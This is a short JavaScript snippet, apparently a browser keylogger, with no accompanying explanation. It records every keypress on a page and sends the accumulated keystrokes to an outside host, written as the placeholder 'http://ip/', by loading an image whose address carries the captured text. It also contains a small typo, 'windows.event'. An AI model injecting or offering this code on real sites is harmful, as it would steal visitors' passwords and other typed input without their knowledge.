var k = "";
document.onkeypress = function(e){
  
    e = e || windows.event;
    k +=e.key;

  var i = new Image();
  i.src = "http://ip/" + k;


};